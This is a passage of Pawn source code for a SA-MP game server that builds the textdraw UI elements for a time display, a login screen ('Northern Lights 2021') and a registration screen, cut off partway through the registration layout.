		PlayerTextDrawLetterSize(playerid, PVreme[ playerid ][ 1 ], 0.237499, 1.121664);
		PlayerTextDrawAlignment(playerid, PVreme[ playerid ][ 1 ], 2);
		PlayerTextDrawColor(playerid, PVreme[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, PVreme[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, PVreme[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, PVreme[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, PVreme[ playerid ][ 1 ], 2);
		PlayerTextDrawSetProportional(playerid, PVreme[ playerid ][ 1 ], 1);

		PVreme[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 241.875000, 408.916687, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PVreme[ playerid ][ 2 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PVreme[ playerid ][ 2 ], 1.250000, 16.333312);
		PlayerTextDrawAlignment(playerid, PVreme[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, PVreme[ playerid ][ 2 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, PVreme[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, PVreme[ playerid ][ 2 ], 0);
		PlayerTextDrawFont(playerid, PVreme[ playerid ][ 2 ], 4);

		PVreme[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 392.500000, 408.916687, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PVreme[ playerid ][ 3 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PVreme[ playerid ][ 3 ], 1.250000, 16.916625);
		PlayerTextDrawAlignment(playerid, PVreme[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, PVreme[ playerid ][ 3 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, PVreme[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, PVreme[ playerid ][ 3 ], 0);
		PlayerTextDrawFont(playerid, PVreme[ playerid ][ 3 ], 4);

		PVreme[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 241.875000, 408.333343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PVreme[ playerid ][ 4 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PVreme[ playerid ][ 4 ], 151.250000, 1.750000);
		PlayerTextDrawAlignment(playerid, PVreme[ playerid ][ 4 ], 1);
		PlayerTextDrawColor(playerid, PVreme[ playerid ][ 4 ], SRVBOJA1 );
		PlayerTextDrawSetShadow(playerid, PVreme[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, PVreme[ playerid ][ 4 ], 0);
		PlayerTextDrawFont(playerid, PVreme[ playerid ][ 4 ], 4);

        for( new i = 0; i < 5; i ++) {
			PlayerTextDrawShow( playerid, PVreme[ playerid ][ i ] );
		}

	}
	else if( show == false ) {
		for( new i = 0; i < 5; i ++) {
			PlayerTextDrawHide( playerid, PVreme[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, PVreme[ playerid ][ i ] );
			PVreme[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
createLogin_TD() {

    Login_TD[0] = TextDrawCreate(245.850036, 104.559257, "");
    TextDrawTextSize(Login_TD[0], 76.000000, 74.000000);
    TextDrawAlignment(Login_TD[0], 1);
    TextDrawColor(Login_TD[0], -1);
    TextDrawSetShadow(Login_TD[0], 0);
    TextDrawFont(Login_TD[0], 5);
    TextDrawSetProportional(Login_TD[0], 0);
    TextDrawSetPreviewModel(Login_TD[0], 19177);
    TextDrawBackgroundColor(Login_TD[0], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[0], 0.000000, 0.000000, 0.000000, 1.000000);

    Login_TD[1] = TextDrawCreate(267.483215, 172.111160, "");
    TextDrawTextSize(Login_TD[1], 67.000000, 92.000000);
    TextDrawAlignment(Login_TD[1], 1);
    TextDrawColor(Login_TD[1], -1);
    TextDrawSetShadow(Login_TD[1], 0);
    TextDrawFont(Login_TD[1], 5);
    TextDrawSetProportional(Login_TD[1], 0);
    TextDrawSetPreviewModel(Login_TD[1], 1318);
    TextDrawBackgroundColor(Login_TD[1], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[1], 0.000000, 35.000000, 0.000000, 1.000000);

    Login_TD[2] = TextDrawCreate(234.349304, 102.459259, "");
    TextDrawTextSize(Login_TD[2], 76.000000, 79.000000);
    TextDrawAlignment(Login_TD[2], 1);
    TextDrawColor(Login_TD[2], -1);
    TextDrawSetShadow(Login_TD[2], 0);
    TextDrawFont(Login_TD[2], 5);
    TextDrawSetProportional(Login_TD[2], 0);
    TextDrawSetPreviewModel(Login_TD[2], 19177);
    TextDrawBackgroundColor(Login_TD[2], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[2], 0.000000, 180.000000, 0.000000, 1.000000);

    Login_TD[3] = TextDrawCreate(237.466705, 138.307418, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[3], 35.000000, 7.000000);
    TextDrawAlignment(Login_TD[3], 1);
    TextDrawColor(Login_TD[3], -1);
    TextDrawSetShadow(Login_TD[3], 0);
    TextDrawBackgroundColor(Login_TD[3], 255);
    TextDrawFont(Login_TD[3], 4);
    TextDrawSetProportional(Login_TD[3], 0);

    Login_TD[4] = TextDrawCreate(208.882736, 133.700088, "");
    TextDrawTextSize(Login_TD[4], 63.000000, 93.000000);
    TextDrawAlignment(Login_TD[4], 1);
    TextDrawColor(Login_TD[4], -1);
    TextDrawSetShadow(Login_TD[4], 0);
    TextDrawFont(Login_TD[4], 5);
    TextDrawSetProportional(Login_TD[4], 0);
    TextDrawSetPreviewModel(Login_TD[4], 19177);
    TextDrawBackgroundColor(Login_TD[4], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[4], 0.000000, -90.000000, 90.000000, 1.000000);

    Login_TD[5] = TextDrawCreate(237.466705, 138.307418, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[5], 6.000000, 42.000000);
    TextDrawAlignment(Login_TD[5], 1);
    TextDrawColor(Login_TD[5], -1);
    TextDrawSetShadow(Login_TD[5], 0);
    TextDrawBackgroundColor(Login_TD[5], 255);
    TextDrawFont(Login_TD[5], 4);
    TextDrawSetProportional(Login_TD[5], 0);

    Login_TD[6] = TextDrawCreate(209.599304, 147.408233, "");
    TextDrawTextSize(Login_TD[6], 62.289558, 93.160003);
    TextDrawAlignment(Login_TD[6], 1);
    TextDrawColor(Login_TD[6], -1);
    TextDrawSetShadow(Login_TD[6], 0);
    TextDrawFont(Login_TD[6], 5);
    TextDrawSetProportional(Login_TD[6], 0);
    TextDrawSetPreviewModel(Login_TD[6], 19177);
    TextDrawBackgroundColor(Login_TD[6], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[6], 0.000000, 90.000000, 90.000000, 1.000000);

    Login_TD[7] = TextDrawCreate(237.916717, 194.325897, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[7], 5.709897, 112.809959);
    TextDrawAlignment(Login_TD[7], 1);
    TextDrawColor(Login_TD[7], -1);
    TextDrawSetShadow(Login_TD[7], 0);
    TextDrawBackgroundColor(Login_TD[7], 255);
    TextDrawFont(Login_TD[7], 4);
    TextDrawSetProportional(Login_TD[7], 0);

    Login_TD[8] = TextDrawCreate(238.216751, 300.240600, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[8], 110.000000, 7.000000);
    TextDrawAlignment(Login_TD[8], 1);
    TextDrawColor(Login_TD[8], -1);
    TextDrawSetShadow(Login_TD[8], 0);
    TextDrawBackgroundColor(Login_TD[8], 255);
    TextDrawFont(Login_TD[8], 4);
    TextDrawSetProportional(Login_TD[8], 0);

    Login_TD[9] = TextDrawCreate(388.449768, 138.325881, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[9], 5.709897, 113.000000);
    TextDrawAlignment(Login_TD[9], 1);
    TextDrawColor(Login_TD[9], -1);
    TextDrawSetShadow(Login_TD[9], 0);
    TextDrawBackgroundColor(Login_TD[9], 255);
    TextDrawFont(Login_TD[9], 4);
    TextDrawSetProportional(Login_TD[9], 0);

    Login_TD[10] = TextDrawCreate(360.948944, 204.881546, "");
    TextDrawTextSize(Login_TD[10], 60.849800, 93.160003);
    TextDrawAlignment(Login_TD[10], 1);
    TextDrawColor(Login_TD[10], -1);
    TextDrawSetShadow(Login_TD[10], 0);
    TextDrawFont(Login_TD[10], 5);
    TextDrawSetProportional(Login_TD[10], 0);
    TextDrawSetPreviewModel(Login_TD[10], 19177);
    TextDrawBackgroundColor(Login_TD[10], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[10], 0.000000, -90.000000, 90.000000, 1.000000);

    Login_TD[11] = TextDrawCreate(309.866455, 268.518615, "");
    TextDrawTextSize(Login_TD[11], 76.000000, 70.649902);
    TextDrawAlignment(Login_TD[11], 1);
    TextDrawColor(Login_TD[11], -1);
    TextDrawSetShadow(Login_TD[11], 0);
    TextDrawFont(Login_TD[11], 5);
    TextDrawSetProportional(Login_TD[11], 0);
    TextDrawSetPreviewModel(Login_TD[11], 19177);
    TextDrawBackgroundColor(Login_TD[11], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[11], 0.000000, 180.000000, 0.000000, 1.000000);

    Login_TD[12] = TextDrawCreate(321.767181, 268.418609, "");
    TextDrawTextSize(Login_TD[12], 76.000000, 70.649902);
    TextDrawAlignment(Login_TD[12], 1);
    TextDrawColor(Login_TD[12], -1);
    TextDrawSetShadow(Login_TD[12], 0);
    TextDrawFont(Login_TD[12], 5);
    TextDrawSetProportional(Login_TD[12], 0);
    TextDrawSetPreviewModel(Login_TD[12], 19177);
    TextDrawBackgroundColor(Login_TD[12], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[12], 0.000000, 360.000000, 0.000000, 1.000000);

    Login_TD[13] = TextDrawCreate(360.066497, 300.385253, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[13], 34.430095, 6.829996);
    TextDrawAlignment(Login_TD[13], 1);
    TextDrawColor(Login_TD[13], -1);
    TextDrawSetShadow(Login_TD[13], 0);
    TextDrawBackgroundColor(Login_TD[13], 255);
    TextDrawFont(Login_TD[13], 4);
    TextDrawSetProportional(Login_TD[13], 0);

    Login_TD[14] = TextDrawCreate(360.732543, 219.685195, "");
    TextDrawTextSize(Login_TD[14], 61.079761, 93.139999);
    TextDrawAlignment(Login_TD[14], 1);
    TextDrawColor(Login_TD[14], -1);
    TextDrawSetShadow(Login_TD[14], 0);
    TextDrawFont(Login_TD[14], 5);
    TextDrawSetProportional(Login_TD[14], 0);
    TextDrawSetPreviewModel(Login_TD[14], 19177);
    TextDrawBackgroundColor(Login_TD[14], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[14], 0.000000, 90.000000, 90.000000, 1.000000);

    Login_TD[15] = TextDrawCreate(388.333038, 266.244567, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[15], 6.000000, 40.930179);
    TextDrawAlignment(Login_TD[15], 1);
    TextDrawColor(Login_TD[15], -1);
    TextDrawSetShadow(Login_TD[15], 0);
    TextDrawBackgroundColor(Login_TD[15], 255);
    TextDrawFont(Login_TD[15], 4);
    TextDrawSetProportional(Login_TD[15], 0);

    Login_TD[16] = TextDrawCreate(336.983276, 228.092666, "");
    TextDrawTextSize(Login_TD[16], 142.000000, 170.000000);
    TextDrawAlignment(Login_TD[16], 1);
    TextDrawSetShadow(Login_TD[16], 0);
    TextDrawFont(Login_TD[16], 5);
    TextDrawSetProportional(Login_TD[16], 0);
    TextDrawSetPreviewModel(Login_TD[16], 19089);
    TextDrawBackgroundColor(Login_TD[16], 0x00000000);
    TextDrawColor(Login_TD[16], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[16], 0.000000, -45.000000, 0.000000, 1.000000);

    Login_TD[17] = TextDrawCreate(221.150177, 114.537033, "");
    TextDrawTextSize(Login_TD[17], 142.000000, 170.000000);
    TextDrawAlignment(Login_TD[17], 1);
    TextDrawSetShadow(Login_TD[17], 0);
    TextDrawFont(Login_TD[17], 5);
    TextDrawSetProportional(Login_TD[17], 0);
    TextDrawSetPreviewModel(Login_TD[17], 19089);
    TextDrawBackgroundColor(Login_TD[17], 0x00000000);
    TextDrawColor(Login_TD[17], 0x00000000);
    TextDrawSetPreviewRot(Login_TD[17], 0.000000, -45.000000, 0.000000, 1.000000);

    Login_TD[18] = TextDrawCreate(280.416534, 248.437271, "N_O_R_T_H_E_R_N__L_I_G_H_T_S");
    TextDrawLetterSize(Login_TD[18], 0.146246, 0.749629);
    TextDrawAlignment(Login_TD[18], 1);
    TextDrawColor(Login_TD[18], -1);
    TextDrawSetShadow(Login_TD[18], 0);
    TextDrawBackgroundColor(Login_TD[18], 255);
    TextDrawFont(Login_TD[18], 1);
    TextDrawSetProportional(Login_TD[18], 1);

    Login_TD[19] = TextDrawCreate(292.616394, 181.240844, "/");
    TextDrawLetterSize(Login_TD[19], -0.591250, 1.304443);
    TextDrawAlignment(Login_TD[19], 1);
    TextDrawColor(Login_TD[19], -1);
    TextDrawSetShadow(Login_TD[19], 0);
    TextDrawBackgroundColor(Login_TD[19], 255);
    TextDrawFont(Login_TD[19], 1);
    TextDrawSetProportional(Login_TD[19], 1);

    Login_TD[20] = TextDrawCreate(280.816741, 183.437133, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[20], 6.000000, 64.000000);
    TextDrawAlignment(Login_TD[20], 1);
    TextDrawColor(Login_TD[20], -1);
    TextDrawSetShadow(Login_TD[20], 0);
    TextDrawBackgroundColor(Login_TD[20], 255);
    TextDrawFont(Login_TD[20], 4);
    TextDrawSetProportional(Login_TD[20], 0);

    Login_TD[21] = TextDrawCreate(292.616394, 181.240844, "/");
    TextDrawLetterSize(Login_TD[21], -0.591250, 1.304443);
    TextDrawAlignment(Login_TD[21], 1);
    TextDrawColor(Login_TD[21], -1);
    TextDrawSetShadow(Login_TD[21], 0);
    TextDrawBackgroundColor(Login_TD[21], 255);
    TextDrawFont(Login_TD[21], 1);
    TextDrawSetProportional(Login_TD[21], 1);

    Login_TD[22] = TextDrawCreate(315.866394, 235.603820, "/");
    TextDrawLetterSize(Login_TD[22], -0.591250, 1.304443);
    TextDrawAlignment(Login_TD[22], 1);
    TextDrawColor(Login_TD[22], -1);
    TextDrawSetShadow(Login_TD[22], 0);
    TextDrawBackgroundColor(Login_TD[22], 255);
    TextDrawFont(Login_TD[22], 1);
    TextDrawSetProportional(Login_TD[22], 1);

    Login_TD[23] = TextDrawCreate(312.618682, 183.755661, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[23], 6.000000, 64.000000);
    TextDrawAlignment(Login_TD[23], 1);
    TextDrawColor(Login_TD[23], -1);
    TextDrawSetShadow(Login_TD[23], 0);
    TextDrawBackgroundColor(Login_TD[23], 255);
    TextDrawFont(Login_TD[23], 4);
    TextDrawSetProportional(Login_TD[23], 0);

    Login_TD[24] = TextDrawCreate(324.119384, 183.955657, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[24], 6.000000, 64.000000);
    TextDrawAlignment(Login_TD[24], 1);
    TextDrawColor(Login_TD[24], -1);
    TextDrawSetShadow(Login_TD[24], 0);
    TextDrawBackgroundColor(Login_TD[24], 255);
    TextDrawFont(Login_TD[24], 4);
    TextDrawSetProportional(Login_TD[24], 0);

    Login_TD[25] = TextDrawCreate(324.652709, 239.892730, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[25], 27.000000, 8.000000);
    TextDrawAlignment(Login_TD[25], 1);
    TextDrawColor(Login_TD[25], -1);
    TextDrawSetShadow(Login_TD[25], 0);
    TextDrawBackgroundColor(Login_TD[25], 255);
    TextDrawFont(Login_TD[25], 4);
    TextDrawSetProportional(Login_TD[25], 0);

    Login_TD[26] = TextDrawCreate(280.416534, 248.437271, "N_O_R_T_H_E_R_N__L_I_G_H_T_S");
    TextDrawLetterSize(Login_TD[26], 0.146246, 0.749629);
    TextDrawAlignment(Login_TD[26], 1);
    TextDrawColor(Login_TD[26], -1);
    TextDrawSetShadow(Login_TD[26], 0);
    TextDrawBackgroundColor(Login_TD[26], 255);
    TextDrawFont(Login_TD[26], 1);
    TextDrawSetProportional(Login_TD[26], 1);

    Login_TD[27] = TextDrawCreate(351.666534, 254.777999, "2_0_2_1");
    TextDrawLetterSize(Login_TD[27], 0.146246, 0.749629);
    TextDrawAlignment(Login_TD[27], 3);
    TextDrawColor(Login_TD[27], -1);
    TextDrawSetShadow(Login_TD[27], 0);
    TextDrawBackgroundColor(Login_TD[27], 255);
    TextDrawFont(Login_TD[27], 1);
    TextDrawSetProportional(Login_TD[27], 1);

    Login_TD[28] = TextDrawCreate(351.666534, 254.777999, "2_0_2_1");
    TextDrawLetterSize(Login_TD[28], 0.146246, 0.749629);
    TextDrawAlignment(Login_TD[28], 3);
    TextDrawColor(Login_TD[28], -1);
    TextDrawSetShadow(Login_TD[28], 0);
    TextDrawBackgroundColor(Login_TD[28], 255);
    TextDrawFont(Login_TD[28], 1);
    TextDrawSetProportional(Login_TD[28], 1);

    Login_TD[29] = TextDrawCreate(284.149810, 138.444458, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[29], 110.000000, 7.000000);
    TextDrawAlignment(Login_TD[29], 1);
    TextDrawColor(Login_TD[29], -1);
    TextDrawSetShadow(Login_TD[29], 0);
    TextDrawBackgroundColor(Login_TD[29], 255);
    TextDrawFont(Login_TD[29], 4);
    TextDrawSetProportional(Login_TD[29], 0);

    Login_TD[30] = TextDrawCreate(388.549743, 243.048126, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[30], 5.130002, 8.000000);
    TextDrawAlignment(Login_TD[30], 1);
    TextDrawColor(Login_TD[30], -1);
    TextDrawSetShadow(Login_TD[30], 0);
    TextDrawBackgroundColor(Login_TD[30], 255);
    TextDrawFont(Login_TD[30], 4);
    TextDrawSetProportional(Login_TD[30], 0);

    Login_TD[31] = TextDrawCreate(341.466552, 300.522186, "LD_SPAC:white");
    TextDrawTextSize(Login_TD[31], 6.020022, 6.639990);
    TextDrawAlignment(Login_TD[31], 1);
    TextDrawColor(Login_TD[31], -1);
    TextDrawSetShadow(Login_TD[31], 0);
    TextDrawBackgroundColor(Login_TD[31], 255);
    TextDrawFont(Login_TD[31], 4);
    TextDrawSetProportional(Login_TD[31], 0);

    Login_TD[32] = TextDrawCreate(315.866394, 235.603820, "/");
    TextDrawLetterSize(Login_TD[32], -0.591250, 1.304443);
    TextDrawAlignment(Login_TD[32], 1);
    TextDrawColor(Login_TD[32], -1);
    TextDrawSetShadow(Login_TD[32], 0);
    TextDrawBackgroundColor(Login_TD[32], 255);
    TextDrawFont(Login_TD[32], 1);
    TextDrawSetProportional(Login_TD[32], 1);

    Login_TDFirst[0] = TextDrawCreate(-15.000000, -15.106481, "LD_SPAC:white");
    TextDrawTextSize(Login_TDFirst[0], 754.000000, 513.000000);
    TextDrawAlignment(Login_TDFirst[0], 1);
    TextDrawColor(Login_TDFirst[0], 404235256); // stara boja 51714805
    TextDrawSetShadow(Login_TDFirst[0], 0);
    TextDrawBackgroundColor(Login_TDFirst[0], 255);
    TextDrawFont(Login_TDFirst[0], 4);
    TextDrawSetProportional(Login_TDFirst[0], 0);

    Login_TDFirst[1] = TextDrawCreate(-263.333282, 270.596832, "particle:lamp_shad_64");
    TextDrawTextSize(Login_TDFirst[1], 1148.000000, -432.000000);
    TextDrawAlignment(Login_TDFirst[1], 1);
    TextDrawColor(Login_TDFirst[1], -239);
    TextDrawSetShadow(Login_TDFirst[1], 0);
    TextDrawBackgroundColor(Login_TDFirst[1], 255);
    TextDrawFont(Login_TDFirst[1], 4);
    TextDrawSetProportional(Login_TDFirst[1], 0);
}
//------------------------------------------------------------------------------
stock LoginTDControl( playerid, bool:show ) {

    if( show == true ) {

        TextDrawShowForPlayer(playerid, Login_TDFirst[0]);
        TextDrawShowForPlayer(playerid, Login_TDFirst[1]);

       	for( new i = 0; i < 33; i ++) {
            TextDrawShowForPlayer(playerid, Login_TD[i]);
		}

    }
    else if( show == false ) {

        TextDrawHideForPlayer(playerid, Login_TDFirst[0]);
        TextDrawHideForPlayer(playerid, Login_TDFirst[1]);

        for( new i = 0; i < 33; i ++) {
        
            TextDrawHideForPlayer(playerid, Login_TD[i]);
		}
	}
}
//------------------------------------------------------------------------------
stock RegisterTDControl( playerid, bool:show ) {
	if(show == true) {

        RegisterTD[playerid][0] = CreatePlayerTextDraw(playerid, 174.398681, 136.612976, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][0], 0.000000, 20.949979);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][0], 470.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][0], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][0], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][0], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][0], 219685375);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][0], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][0], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][0], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][0], 1);

        RegisterTD[playerid][1] = CreatePlayerTextDraw(playerid, 174.700012, 137.062500, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][1], 0.000000, -0.299997);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][1], 469.929748, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][1], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][1], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][1], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][1], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][1], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][1], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][1], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][1], 1);

        RegisterTD[playerid][2] = CreatePlayerTextDraw(playerid, 297.100189, 137.500000, "ld_Beat:chit");
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][2], 49.000000, 41.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][2], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][2], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][2], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][2], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][2], 4);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][2], 0);

        RegisterTD[playerid][3] = CreatePlayerTextDraw(playerid, 299.000305, 139.100097, "ld_Beat:chit");
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][3], 45.000000, 37.690219);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][3], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][3], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][3], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][3], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][3], 4);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][3], 0);

        RegisterTD[playerid][4] = CreatePlayerTextDraw(playerid, 300.900421, 140.800201, "ld_Beat:chit");
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][4], 41.000000, 34.430095);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][4], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][4], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][4], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][4], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][4], 4);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][4], 0);

        RegisterTD[playerid][5] = CreatePlayerTextDraw(playerid, 303.400451, 143.062652, "ld_Beat:chit");
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][5], 36.000000, 30.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][5], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][5], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][5], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][5], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][5], 4);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][5], 0);

        RegisterTD[playerid][6] = CreatePlayerTextDraw(playerid, 303.500030, 156.750000, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][6], 0.000000, 0.314999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][6], 339.500030, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][6], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][6], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][6], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][6], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][6], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][6], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][6], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][6], 1);

        RegisterTD[playerid][7] = CreatePlayerTextDraw(playerid, 302.500000, 155.000000, "VALHALLA_OGC");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][7], 0.155496, 0.615625);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][7], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][7], -1);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][7], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][7], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][7], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][7], 1);

        RegisterTD[playerid][8] = CreatePlayerTextDraw(playerid, 311.500000, 155.437500, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][8], 0.000000, 0.249999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][8], 315.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][8], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][8], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][8], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][8], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][8], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][8], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][8], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][8], 1);

        RegisterTD[playerid][9] = CreatePlayerTextDraw(playerid, 315.700256, 154.137420, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][9], 0.000000, 0.149995);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][9], 315.400085, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][9], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][9], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][9], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][9], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][9], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][9], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][9], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][9], 1);

        RegisterTD[playerid][10] = CreatePlayerTextDraw(playerid, 318.000396, 154.937469, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][10], 0.000000, 0.099999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][10], 317.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][10], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][10], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][10], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][10], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][10], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][10], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][10], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][10], 1);

        RegisterTD[playerid][11] = CreatePlayerTextDraw(playerid, 320.800567, 154.737457, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][11], 0.000000, 0.099999);
        PlayerTextDrawTextSize(playerid, RegisterTD[playerid][11], 325.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RegisterTD[playerid][11], 1);
        PlayerTextDrawColor(playerid, RegisterTD[playerid][11], -1);
        PlayerTextDrawUseBox(playerid, RegisterTD[playerid][11], 1);
        PlayerTextDrawBoxColor(playerid, RegisterTD[playerid][11], 255);
        PlayerTextDrawSetShadow(playerid, RegisterTD[playerid][11], 0);
        PlayerTextDrawBackgroundColor(playerid, RegisterTD[playerid][11], 255);
        PlayerTextDrawFont(playerid, RegisterTD[playerid][11], 1);
        PlayerTextDrawSetProportional(playerid, RegisterTD[playerid][11], 1);

        RegisterTD[playerid][12] = CreatePlayerTextDraw(playerid, 327.800567, 155.225067, "box");
        PlayerTextDrawLetterSize(playerid, RegisterTD[playerid][12], 0.000000, 0.199999);
